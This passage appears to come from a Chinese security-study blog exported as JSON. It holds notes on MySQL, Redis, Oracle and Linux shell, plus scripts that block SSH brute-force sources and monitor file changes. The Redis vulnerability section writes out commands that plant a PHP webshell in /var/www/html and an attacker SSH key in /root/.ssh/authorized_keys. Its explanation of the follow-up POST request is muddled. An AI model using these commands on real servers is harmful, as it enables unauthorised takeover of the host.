coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid WHERE AvgScore &gt;70&#x27;;错误SELECT coursed,AVG(score) AS AvgScore FROM grade WHERE AvgScore &gt;70&#x27; GROUP BY courseid :错误# 子查询的 语句 ANY ALL SELECT age FROM student WHERE age &lt;ANY(SELECT DISTINCT(age) From student WHERE degree=&#x27;xxx&#x27;)# UNION 两条SQL语句的查询结果拼成一个结果集 SELECT xxx 用于一些灵活的东西 SELCT classid.calssname FROM class UNION SELECT &#x27;S04&#x27;,&#x27;网安3班&#x27;# 多表查询SELECT * FROM student ,class where student.studentid = grade.studentid;SELECT * FROM student JOIN class ON student.studentid = grade.studentid;SELECT * FROM student INNER JOIN class ON student.studentid = grade.studentid;# left join on 和right join on# 视图 可以把一个很复杂的SQL语句创建为视图，从而将查询结果永久的保存在一张类似表的结构中去，并且支持SQL查询# 索引# 用于帮助提升数据库查询性能，避免全表扫描导致速度极慢# 如何判断索引是否成功EXPLAIN SELECT * from customer where phone=&#x27;xxx&#x27;# 利用sql语句写到文件SELECT “xxx ” INTO OUTFILE &#x27;/tmp/xxx&#x27;# 数据库备份mysqldump -h127.0.0.1 -ppassword xxx &gt;xx.sql# 还原数据库mysqldump -h127.0.0.1 -ppassword xxx &lt;xx.sql 主从复制 两台机器进行数据的实时同步。Master,Slave 所有数据以Master为准，Slave 进行实时复制同步&#x3D;&#x3D;》实时备份，读写分离，写数据到Master,读从Salve。 3、Redis 数据库使用最为广泛的缓存服务器，数据保存在内存中，所有的IO操作在内存中，速度非常快，性能非常高。 断电数据消失。 安装与使用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576# 下载链接 https://redis.io/download/tar xzvf redis-7.0.11.tar.gzcd redis-7.0.11/ &amp;&amp; make &amp;&amp; make installredis-server ./redis.conf [root@192 redis-7.0.11]# redis-cli127.0.0.1:6379&gt; set name zwjOK127.0.0.1:6379&gt; get name&quot;zwj&quot;# 设置过期时间127.0.0.1:6379&gt; expire name 10(integer) 1127.0.0.1:6379&gt; exists name(integer) 1127.0.0.1:6379&gt; ttl name(integer) 2127.0.0.1:6379&gt; ttl name(integer) -2127.0.0.1:6379&gt; exists name(integer) 0127.0.0.1:6379&gt; ttl name(integer) -1127.0.0.1:6379&gt; expire name 10(integer) 1127.0.0.1:6379&gt; ttl name(integer) 8127.0.0.1:6379&gt; PERSIST name(integer) 1127.0.0.1:6379&gt; ttl name(integer) -1# 按照列进行设置，可用于表格类型的存储 （hash类型数据）127.0.0.1:6379&gt; hset user_1 name zwj(integer) 1127.0.0.1:6379&gt; hset user_1 address chengdu(integer) 1127.0.0.1:6379&gt; hset user_1 age 19(integer) 1127.0.0.1:6379&gt; HGET user_1 name&quot;zwj&quot;127.0.0.1:6379&gt; # 列表类型的数据127.0.0.1:6379&gt; lpush name_list lisi(integer) 2127.0.0.1:6379&gt; lpush name_list wangwu(integer) 3127.0.0.1:6379&gt; keys name_list1) &quot;name_list&quot;127.0.0.1:6379&gt; lrange name_list 0 -11) &quot;wangwu&quot;2) &quot;lisi&quot;3) &quot;zhangsan&quot;127.0.0.1:6379&gt; LINDEX name_list 0&quot;wangwu&quot;# 集合类型的数据 （不允许重复） 默认会去重处理 sadd 添加的不排序，zadd 添加的会按照score排序sadd key value127.0.0.1:6379&gt; sadd set qwer qwer(integer) 1 (新增一个)127.0.0.1:6379&gt; sadd set qwer 12345(integer) 1 （只新增一个）127.0.0.1:6379&gt; sadd set 22 33 44 (integer) 3 （新增3个）127.0.0.1:6379&gt; scard set(integer) 5127.0.0.1:6379&gt; smembers set1) &quot;33&quot;2) &quot;22&quot;3) &quot;12345&quot;4) &quot;qwer&quot;5) &quot;44&quot;# 清空数据库flushdb # 清空当前 flush 默认16个数据库flushall # 清空所有 配置远程连接 123456vim redis.config注释 bind 127.0.0.1 -::1取消注释 requiredpass 123456firewalld 开放6379 端口 123456789101112131415161718192021222324252627282930313233[root@192 ~]# firewall-cmd --list-allpublic (active) target: default icmp-block-inversion: no interfaces: ens33 sources: services: dhcpv6-client ssh ports: 3306/tcp protocols: masquerade: no forward-ports: source-ports: icmp-blocks: rich rules: [root@192 ~]# firewall-cmd --add-port=6379/tcp --permanent success[root@192 ~]# firewall-cmd --reloadsuccess[root@192 ~]# firewall-cmd --list-allpublic (active) target: default icmp-block-inversion: no interfaces: ens33 sources: services: dhcpv6-client ssh ports: 3306/tcp 6379/tcp protocols: masquerade: no forward-ports: source-ports: icmp-blocks: rich rules: 配置后台运行 12vim redis.conf更改 daemonize yes redis 持久化 rdb 保存 默认情况下保存在dump.rdb文件中 更改策略如下： 12345678# * After 3600 seconds (an hour) if at least 1 change was performed# * After 300 seconds (5 minutes) if at least 100 changes were performed# * After 60 seconds if at least 10000 changes were performed## You can set these explicitly by uncommenting the following line.## save 3600 1 300 100 60 10000save 60 2 # 一分钟内有两个key发生了变化就备份 AOF保存 123456789101112131415always 每次写入都同步everysec 每秒一次no 系统控制修改 redis.confappendonly no 更改为yes 默认关闭修改同步策略 默认每秒# appendfsync alwaysappendfsync everysec# appendfsync no 主从复制 配置master和slave 两台电脑分别配置后台运行，可远程登录，需要密码，日志路径，然后在slave 机器上 masterauth pass 12345daeminize yesmasterauth 123456requirepass 123456logfile redis.log注释掉 bind 127.0.0.1 -：：1 接着在slave 机器上运行slaveeof masterip masterport ，最后用info replication 查看配置情况 安全漏洞相关 redis写入webshell 12345678910111213141516171819202122config set dir /var/www/htmlconfig set dbfilename zcc.phpset xxx &quot;\\n\\n\\n&lt;?php @eal($_POST[&#x27;zcc&#x27;]);?&gt;\\n\\n&quot;save攻击者可以通过向受攻击的服务器发送恶意 HTTP POST 请求来利用这段代码。具体步骤如下：1. 获取 Redis 服务器的 IP 地址和端口号。2. 发送一个类似于以下内容的 HTTP POST 请求到服务器：```POST / HTTP/1.1Host: &lt;Redis 服务器 IP 地址&gt;:&lt;Redis 服务器端口号&gt;Content-Type: application/x-www-form-urlencodedContent-Length: &lt;Payload 长度&gt;zcc=&lt;?php phpinfo();?&gt;```上述请求会将一段 PHP 代码 `&lt;?php phpinfo();?&gt;` 发送给 Redis 数据库，并将其存储到之前设置的名为 &quot;xxx&quot; 的键中。3. 在发送完请求后，攻击者可以访问之前指定的目录 `/var/www/html`，并执行 `zcc.php` 文件。该文件中包含了攻击者注入的 PHP 代码，因此会执行 `phpinfo()` 函数并显示当前 PHP 环境的信息。 redis 写入ssh公钥登录 12345ssh-keygen -t rsa config set dir /root/.sshconfig set dbfilename authorized_keysset x &quot;\\n\\n\\n 公钥 \\n\\n\\n&quot;save 4、Oracle关系型数据库，企业型数据库，比较复杂，主要掌握和Mysql 数据库的区别，大同小异 Oracle 的数据库结构 oracle服务-&gt;表空间-&gt;多个表-&gt;各个表结构 Oracle 的用户 Oracle 的日期格式，to_date(“日期”，‘YYYY-MM-DD HH24:Mi:SS’) 转换，输出的时候用to_char(date,‘YYYY-MM-DD HH24:Mi:SS’) Group By 使用时，聚合函数不能与无关的列放在一起select 没有Limit 关键词，要用rownum,虚拟列 如取前10 rownum&lt;&#x3D;10; 没有自增列，要创建序列 12select MYSEQ.nextval from dual;insert into demo(id,name) values(MYSEQ.nextval,&#x27;zhangsan&#x27;); 备份命令 exp &#x2F;imp","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"屏蔽SSH远程暴力登录","slug":"屏蔽SSH远程暴力登录","date":"2023-04-19T16:00:00.000Z","updated":"2023-07-27T14:25:29.219Z","comments":true,"path":"2023/04/20/屏蔽SSH远程暴力登录/","link":"","permalink":"http://zwjsfdbb.top/2023/04/20/%E5%B1%8F%E8%94%BDSSH%E8%BF%9C%E7%A8%8B%E6%9A%B4%E5%8A%9B%E7%99%BB%E5%BD%95/","excerpt":"1、背景通过SSH远程登录失败多次，通过防火墙将其屏蔽，并发送通知 2、分析问题-解决过程如何判断SSH远程登录失败 通过查看&#x2F;var&#x2F;log&#x2F;secure 查看，如下即为登录失败的情况，如果多次出现，则可以判定为非法登录 12Apr 20 22:16:40 192 sshd[5101]: Failed password for root from 192.168.101.15 port 50632 ssh2 123456789101112failedcount=$(cat /var/log/secure |grep &quot;Failed password&quot;|wc -l)if [ $failedcount -gt 2 ]; then echo &quot;too many count&quot; ip=$(cat /var/log/secure |grep &quot;Failed&quot; |awk &#x27;&#123;print $11&#125;&#x27; |uniq) status_fire=$(firewall-cmd --state) if [ $status_fire != &quot;running&quot; ]; then systemctl start firewalld fi firewall-cmd --add-rich-rule=&#x27;rule family=ipv4 source address=&quot;$ip&quot; drop&#x27; echo &quot;$ip 被防火墙阻止&quot; fi pkill 可根据进程名kill 掉进程 who 可以看到哪些人登录了","text":"1、背景通过SSH远程登录失败多次，通过防火墙将其屏蔽，并发送通知 2、分析问题-解决过程如何判断SSH远程登录失败 通过查看&#x2F;var&#x2F;log&#x2F;secure 查看，如下即为登录失败的情况，如果多次出现，则可以判定为非法登录 12Apr 20 22:16:40 192 sshd[5101]: Failed password for root from 192.168.101.15 port 50632 ssh2 123456789101112failedcount=$(cat /var/log/secure |grep &quot;Failed password&quot;|wc -l)if [ $failedcount -gt 2 ]; then echo &quot;too many count&quot; ip=$(cat /var/log/secure |grep &quot;Failed&quot; |awk &#x27;&#123;print $11&#125;&#x27; |uniq) status_fire=$(firewall-cmd --state) if [ $status_fire != &quot;running&quot; ]; then systemctl start firewalld fi firewall-cmd --add-rich-rule=&#x27;rule family=ipv4 source address=&quot;$ip&quot; drop&#x27; echo &quot;$ip 被防火墙阻止&quot; fi pkill 可根据进程名kill 掉进程 who 可以看到哪些人登录了 12345678910111213141516171819202122232425262728293031# 实现功能，防火墙禁止访问以及关闭已经连接的session failedcount=$(cat /var/log/secure |grep &quot;Failed password&quot;|wc -l)if [ $failedcount -gt 2 ]; then echo &quot;too many count&quot; status_fire=$(firewall-cmd --state) if [ $status_fire != &quot;running&quot; ]; then systemctl start firewalld fi ip=&#x27;ip.txt&#x27; cat /var/log/secure |grep &quot;Failed&quot; |awk &#x27;&#123;print $11&#125;&#x27; |uniq &gt;$ip while read line;do firewall-cmd --add-rich-rule=&#x27;rule family=ipv4 source address=&quot;$line&quot; drop&#x27; if [ $? -eq 0 ]; then echo &quot;$line 被防火墙阻止&quot; else echo &quot;$line 未能被防火墙阻止&quot; &gt;alert.log mail -s &#x27;重要警告&#x27; 2194620553@qq.com &lt;alert.log fi # kill 已经连接的session who|grep $line|awk &#x27;print $2&#x27;&gt;tty.log while read xxx;do pkill -kill -t $xxx done &lt; tty.log # who |grep $ip |while read line; do term=$(echo $line|awk &#x27;&#123;print $2&#125;&#x27;);pkill -kill -t $term ; done done &lt; $ip # 替换掉已经操作的，防止重复操作 sed -i &#x27;s/Failed password/Failedxxpassword/g&#x27; /var/log/secure fi","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Linux 文件监控小脚本","slug":"Linux 文件监控_new","date":"2023-04-17T16:00:00.000Z","updated":"2023-07-22T06:06:33.505Z","comments":true,"path":"2023/04/18/Linux 文件监控_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/18/Linux%20%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7_new/","excerpt":"Linux文件监控小脚本1、通过md5sum 对比 1234# 计算root目录下所有文件的md5 并重定向到origin_md5find /root/* --type f |xargs md5sum &gt; origin_md5# 检查文件有没有被修改，导致md5变化mdsum -c orign_md5 2、通过diff 命令比较内容的修改，目录里面文件的新增也可以检测到 修改了xxx .&#x2F;origin&#x2F;anaconda-ks.cfg: OK.&#x2F;origin&#x2F;monitor.sh: OK.&#x2F;origin&#x2F;test.txt: OK.&#x2F;origin&#x2F;xxx: FAILEDmd5sum: WARNING: 1 computed checksum did NOT match 删除了xxx .&#x2F;origin&#x2F;anaconda-ks.cfg: OK.&#x2F;origin&#x2F;monitor.sh: OK.&#x2F;origin&#x2F;test.txt: OKmd5sum: .&#x2F;origin&#x2F;xxx: No such file or directory.&#x2F;origin&#x2F;xxx: FAILED open or readmd5sum: WARNING: 1 listed file could not be read","text":"Linux文件监控小脚本1、通过md5sum 对比 1234# 计算root目录下所有文件的md5 并重定向到origin_md5find /root/* --type f |xargs md5sum &gt; origin_md5# 检查文件有没有被修改，导致md5变化mdsum -c orign_md5 2、通过diff 命令比较内容的修改，目录里面文件的新增也可以检测到 修改了xxx .&#x2F;origin&#x2F;anaconda-ks.cfg: OK.&#x2F;origin&#x2F;monitor.sh: OK.&#x2F;origin&#x2F;test.txt: OK.&#x2F;origin&#x2F;xxx: FAILEDmd5sum: WARNING: 1 computed checksum did NOT match 删除了xxx .&#x2F;origin&#x2F;anaconda-ks.cfg: OK.&#x2F;origin&#x2F;monitor.sh: OK.&#x2F;origin&#x2F;test.txt: OKmd5sum: .&#x2F;origin&#x2F;xxx: No such file or directory.&#x2F;origin&#x2F;xxx: FAILED open or readmd5sum: WARNING: 1 listed file could not be read 新增 [root@192 ~]# diff origin afterOnly in origin: xxx1 123456789101112131415161718192021222324252627282930313233343536373839md5_log=&#x27;./origin_md5&#x27;if [ $# -eq 2 ]; then origin=$1 after=$2elif [ $# -eq 3 ]; then origin=$1 after=$2 new=$3 if [ $new = &quot;new&quot; ]; then mkdir $after cp $origin/* $after find $origin -type f |xargs md5sum |tee $md5_log exit 0 fielse echo &quot;参数错误&quot; exit 1fi# 文件新增diff_result=$(diff $origin $after|grep ^Only |sed -e &#x27;s/Only in//g&#x27; -e &#x27;s/: /\\//g&#x27;)if [ $? -eq 0 ]; then echo -e &#x27;**文件变化情况**\\n&#x27;&quot;$diff_result&quot; | tee result.log mail -s &quot;text&quot; &quot;2194620553@qq.com&quot;&lt; result.logfi# 文件内容修改content_diff=$(md5sum -c $md5_log 2&gt;/dev/null |grep &quot;FAILED$&quot;|sed -e &#x27;s/FAILED//g&#x27;)if [ $? -eq 0 ]; then echo -e &quot;***被修改的文件情况***\\n&quot;&quot;$content_diff&quot; | tee md5_result mail -s &quot;text&quot; &quot;2194620553@qq.com&quot; &lt;md5_resultfi# 文件被删除del_diff=$(md5sum -c $md5_log 2&gt;/dev/null |grep &quot;FAILED open or read&quot;|sed -e &#x27;s/FAILED open or read//g&#x27;)if [ $? -eq 0 ]; then echo -e &quot;***被删除的文件情况***\\n&quot;&quot;$del_diff&quot; | tee del_log mail -s &quot;test&quot; &quot;2194620553@qq.com&quot; &lt;del_logfi","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Linux基础","slug":"Linux基础_new","date":"2023-04-05T16:00:00.000Z","updated":"2023-07-22T02:53:56.587Z","comments":true,"path":"2023/04/06/Linux基础_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/06/Linux%E5%9F%BA%E7%A1%80_new/","excerpt":"Linux 基础1、Centos 7 软件安装 rpm 安装 rpm -ivh 软件包 rpm -e 软件包 rpm -qa |grep 软件包 源码安装 寻找configure setup.sh install.sh .&#x2F;configure make make install 发现缺少依赖，但是系统已经安装对应的软件，可以尝试安装一下-devel,如pcre-devel yum 安装 yum list yum install yum repolist 列出当前的源 yum deplist 查看依赖库 yum erase 软件包 2、相关命令 net-tools 以及iproute2 两套网络相关命令体系 ip addr add 192.168.101.111&#x2F;24 dev ens33 ifconfig ens33 192.168.101.111 临时增加一个IP地址，一个网卡可以绑定多个IP地址 ss -anl netstat -anlop 列出当前端口占用情况 traceroute 跟踪路由 curl -O url wget -O xxx URL tcpdump tcpdump tcp and dst port 80 -i ens33 -w xx.pcap 3、Linux 命令 tee 命令同时打印到控制台以及文件中 1&gt;file 2&gt;file 1 代表正确的重定向，2代表错误的重定向 关于参数的判断语句 1234567891011if [ &quot;$#&quot; -ne 1 ]; thenecho &quot;参数错误，输入过多 或者未输入参数&quot;exit 1fiif [ -e &quot;$filename&quot; ]; then grep -n &quot;root&quot; $filenameelseecho &quot;文件不存在&quot;exit 1fi 注意[] 前后的空格 $ 必须加引号 关于判断文件以及目录的参数 1234567891011121314-e filename 如果 filename 存在，则为真 [ -e /var/log/syslog ]-d filename 如果 filename 为目录，则为真 [ -d /tmp/mydir ]-f filename 如果 filename 为常规文件，则为真 [ -f /usr/bin/grep ]-L filename 如果 filename 为符号链接，则为真 [ -L /usr/bin/grep ]-r filename 如果 filename 可读，则为真 [ -r /var/log/syslog ]-w filename 如果 filename 可写，则为真 [ -w /var/mytmp.txt ]-x filename 如果 filename 可执行，则为真 [ -L /usr/bin/grep ]-s filename 如果 filename 长度不为零，则为真 [ -s /usr/bin/grep ] 引号 双引号 变量会被引用 单引号，变量不会被引用 反引号，把里面的内容当作一个命令 123456789# 引号相关echo &quot;环境变量的路径： $PATH&quot;echo &#x27;环境变量的路径： $PATH&#x27;echo `date &quot;+%Y-%M-%D&quot;`#output 环境变量的路径： /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin环境变量的路径： $PATH2023-10-04/08/23 $? 非零代表上一条命令失败 $0 代表脚本的名称，$1 是第一个参数 $@ 和$* 返回脚本的参数，前者是多个字符串，或者是一个字符串 expr 数字命令 必须有空格，不能处理小数 1234[root@192 ~]# expr 10+2010+20[root@192 ~]# expr 10 + 2030expr 10 + 10 逻辑运算 a 与 -o 或 ! 非 字符串 -z 为空字符串 -n 为非空字符串 12345678[root@192 ~]# [ -z $xxx ][root@192 ~]# echo $?1[root@192 ~]# [ -n $xxx ][root@192 ~]# echo $?0[root@192 ~]# echo $xxx12345 数值比较 -eq 数值相等 -ne 数值不等 -le 小于等于 -ge 大于等于 -gt 大于 -lt 小于 123456789101112131415161718192021222324252627282930313233- 循环语句 ```shell - #!/usr/bin/bash # for sum=0 for i in &#123;1..100&#125;; do #sum=`expr $sum + $i` #let sum=sum+i ((sum=sum+i)) done echo &quot;$sum&quot; while []; do xxxx done # 后面那个1是步长,双圆括号用在这很好 #for i in &#123;1..100..1&#125;; do for ((i=0;i&lt;=100;i++)); do let sum+=i done echo &quot;sum is $sum&quot; # while #!/usr/bin/bash i=0 sum=0 while [ $i -lt 10 ]; do let sum=sum+i let i++ done echo &quot;$sum&quot; 函数 12345678- function add()&#123; let sum=$1+$2 # 参数取值方式 echo &quot;$sum&quot; # 相当于返回值 &#125; #result=$(add 100 200) result=`add 100 200` #两种赋值方式 echo $result 关于括号的一些用法 (()) 双圆括号，用于运算，可以替代expr，数学运算 123line=1((line+=3))echo $line # 4 ${} 可以去特定参数或变量的值 ${1} $() 可以代替反引号执行圆括号中的命令 $[] 用于整数运算，也可以代替expr ​ 示例 用了阶乘 1234567891011121314function jiecheng()&#123; sum=1 for ((i=1;i&lt;=$1;i++)); do let sum=sum*$i #echo $sum done echo $sum&#125;if [ $# != 1 ];then echo &quot;usage jiecheng number&quot; exit 1firesult=$(jiecheng $1)echo $result","text":"Linux 基础1、Centos 7 软件安装 rpm 安装 rpm -ivh 软件包 rpm -e 软件包 rpm -qa |grep 软件包 源码安装 寻找configure setup.sh install.sh .&#x2F;configure make make install 发现缺少依赖，但是系统已经安装对应的软件，可以尝试安装一下-devel,如pcre-devel yum 安装 yum list yum install yum repolist 列出当前的源 yum deplist 查看依赖库 yum erase 软件包 2、相关命令 net-tools 以及iproute2 两套网络相关命令体系 ip addr add 192.168.101.111&#x2F;24 dev ens33 ifconfig ens33 192.168.101.111 临时增加一个IP地址，一个网卡可以绑定多个IP地址 ss -anl netstat -anlop 列出当前端口占用情况 traceroute 跟踪路由 curl -O url wget -O xxx URL tcpdump tcpdump tcp and dst port 80 -i ens33 -w xx.pcap 3、Linux 命令 tee 命令同时打印到控制台以及文件中 1&gt;file 2&gt;file 1 代表正确的重定向，2代表错误的重定向 关于参数的判断语句 1234567891011if [ &quot;$#&quot; -ne 1 ]; thenecho &quot;参数错误，输入过多 或者未输入参数&quot;exit 1fiif [ -e &quot;$filename&quot; ]; then grep -n &quot;root&quot; $filenameelseecho &quot;文件不存在&quot;exit 1fi 注意[] 前后的空格 $ 必须加引号 关于判断文件以及目录的参数 1234567891011121314-e filename 如果 filename 存在，则为真 [ -e /var/log/syslog ]-d filename 如果 filename 为目录，则为真 [ -d /tmp/mydir ]-f filename 如果 filename 为常规文件，则为真 [ -f /usr/bin/grep ]-L filename 如果 filename 为符号链接，则为真 [ -L /usr/bin/grep ]-r filename 如果 filename 可读，则为真 [ -r /var/log/syslog ]-w filename 如果 filename 可写，则为真 [ -w /var/mytmp.txt ]-x filename 如果 filename 可执行，则为真 [ -L /usr/bin/grep ]-s filename 如果 filename 长度不为零，则为真 [ -s /usr/bin/grep ] 引号 双引号 变量会被引用 单引号，变量不会被引用 反引号，把里面的内容当作一个命令 123456789# 引号相关echo &quot;环境变量的路径： $PATH&quot;echo &#x27;环境变量的路径： $PATH&#x27;echo `date &quot;+%Y-%M-%D&quot;`#output 环境变量的路径： /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin环境变量的路径： $PATH2023-10-04/08/23 $? 非零代表上一条命令失败 $0 代表脚本的名称，$1 是第一个参数 $@ 和$* 返回脚本的参数，前者是多个字符串，或者是一个字符串 expr 数字命令 必须有空格，不能处理小数 1234[root@192 ~]# expr 10+2010+20[root@192 ~]# expr 10 + 2030expr 10 + 10 逻辑运算 a 与 -o 或 ! 非 字符串 -z 为空字符串 -n 为非空字符串 12345678[root@192 ~]# [ -z $xxx ][root@192 ~]# echo $?1[root@192 ~]# [ -n $xxx ][root@192 ~]# echo $?0[root@192 ~]# echo $xxx12345 数值比较 -eq 数值相等 -ne 数值不等 -le 小于等于 -ge 大于等于 -gt 大于 -lt 小于 123456789101112131415161718192021222324252627282930313233- 循环语句 ```shell - #!/usr/bin/bash # for sum=0 for i in &#123;1..100&#125;; do #sum=`expr $sum + $i` #let sum=sum+i ((sum=sum+i)) done echo &quot;$sum&quot; while []; do xxxx done # 后面那个1是步长,双圆括号用在这很好 #for i in &#123;1..100..1&#125;; do for ((i=0;i&lt;=100;i++)); do let sum+=i done echo &quot;sum is $sum&quot; # while #!/usr/bin/bash i=0 sum=0 while [ $i -lt 10 ]; do let sum=sum+i let i++ done echo &quot;$sum&quot; 函数 12345678- function add()&#123; let sum=$1+$2 # 参数取值方式 echo &quot;$sum&quot; # 相当于返回值 &#125; #result=$(add 100 200) result=`add 100 200` #两种赋值方式 echo $result 关于括号的一些用法 (()) 双圆括号，用于运算，可以替代expr，数学运算 123line=1((line+=3))echo $line # 4 ${} 可以去特定参数或变量的值 ${1} $() 可以代替反引号执行圆括号中的命令 $[] 用于整数运算，也可以代替expr ​ 示例 用了阶乘 1234567891011121314function jiecheng()&#123; sum=1 for ((i=1;i&lt;=$1;i++)); do let sum=sum*$i #echo $sum done echo $sum&#125;if [ $# != 1 ];then echo &quot;usage jiecheng number&quot; exit 1firesult=$(jiecheng $1)echo $result 数组的操作 1234567891011121314151617181920212223242526272829declare -a weekday# 数组下标默认从1开始# 单个赋值weekday[1]=Mondayweekday[2]=Tuesdayweekday[3]=xxx#整体赋值weekday=&#123;Monday Tuesday xxx&#125;#全部输出echo $&#123;weekday[@]&#125;#按照下标输出echo $&#123;weekday[1]&#125;#单个输出for day in $&#123;weekday[@]&#125;;do echo $daydone# 修改weekday[1]=qwerecho $&#123;weekday[1]&#125;# 取数组个数echo &quot;数组的个数是 $&#123;#weekday[@]&#125;&quot;#len=$&#123;#weekday[@]&#125;echo $lenfor ((i=1;i&lt;=$len;i++)); do echo &quot;$&#123;weekday[$i]&#125;&quot;done 字符串处理 1、删除字符 #*&#x2F;&#x2F; 从左边开始删除第一个&#x2F;&#x2F; 及其左边的内容 ##*&#x2F; 从左边开始，删除最后一个&#x2F; 及其左边的内容 %&#x2F;* 从右边开始，删除第一个&#x2F; 及其右边的内容 %%&#x2F;* 从右边开始，删除最后一个&#x2F;及其右边的内容 ​ ![image-20230412214344410](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230412214344410.png ​ 取字符 ${str:start:substrlen} 123456phone=&quot;13109097878&quot;echo $&#123;phone:0:5&#125; # 表示从第一个开始取5个字符串echo $&#123;phone:2:5&#125; # 表示从第3个开始取5个字符串echo $&#123;phone:0-5:3&#125; # 表示从倒数第五个开始取3个字符echo $&#123;#phone&#125; # 取字符串的长度 awk 的使用 12345678910111213141516171819awk 选项 处理逻辑 文件echo &quot;Hello Woniuxy Welcome Chengdu&quot; |awk &#x27;&#123;print $2&#125;&#x27; # 默认按照空格隔开后的第二列的内容Woniuxyecho -e &quot;Hello Woniuxy Welcome Chengdu\\nA B C D&quot; |awk &#x27;&#123;print $2&#125;&#x27; #\\n 就分成了两行，然后会输出每一行的第二列的内容WoniuxyBecho &#x27;http://www.woniuxy.com//index.html&#x27; |awk -F &#x27;.&#x27; &#x27;&#123;print $2&#125;&#x27; #用. 作为分隔符echo &#x27;http://www.woniuxy.com//index.html&#x27; |awk -F &#x27;[/.]&#x27; &#x27;&#123;print $2&#125;&#x27; #用/. 两个都作为分隔符ping www.baidu.com -c 2 |awk -F [\\(\\)] &#x27;&#123;print $2&#125;&#x27; # 输出以() 分割的第二列的内容，可以获取IP地址PING www.baidu.com (39.156.66.18) 56(84) bytes of data.64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=1 ttl=51 time=39.9 ms64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=2 ttl=51 time=39.4 msawk -F : &#x27;$1，~/正则表达式/ &#123;print $1&#125;&#x27; /etc/passwd # 输出第一列包含root的以:分割的第一列的内容，~/正则表达式/ sed 的使用 -i 永久修改文件 后续的都是直接显示，但是不会写入到文件 -n 显示处理后的结果 1234# 显示处理后的结果，/root/p 搜索并打印含有root的行，如果改成d 就是搜索并删除含有root的行[root@192 ~]# sed -n &#x27;/root/p&#x27; test.txt root:x:0:0:root:/root:/bin/bashoperator:x:11:0:operator:/root:/sbin/nologin a 新增 在后面新增新行 12345678910111213[root@192 ~]# sed &#x27;5a hello world&#x27; test.txt #在第五行后面新增数据root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinhello worldsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologin d 删除 12345678910[root@192 ~]# sed &#x27;6d&#x27; test.txt #删除第六行root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologin i 插入，在前面插入 新行 123456789101112[root@192 ~]# sed &#x27;5i hellword&#x27; test.txt # 在第五行前面新增一行数据hellowordroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinhellwordlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologin c 取代 1234567891011[root@192 ~]# sed &#x27;1c hellword&#x27; test.txt # 按行替换，替换第一行为helloworldhellwordbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologin sed ‘s&#x2F;root&#x2F;xxxx&#x2F;g’ 搜索root 替换为xxx , g 代表全局替换，不加则表示替换找到的第一个 1234567891011[root@192 ~]# sed &#x27;s/root/xxxxx/g&#x27; test.txt 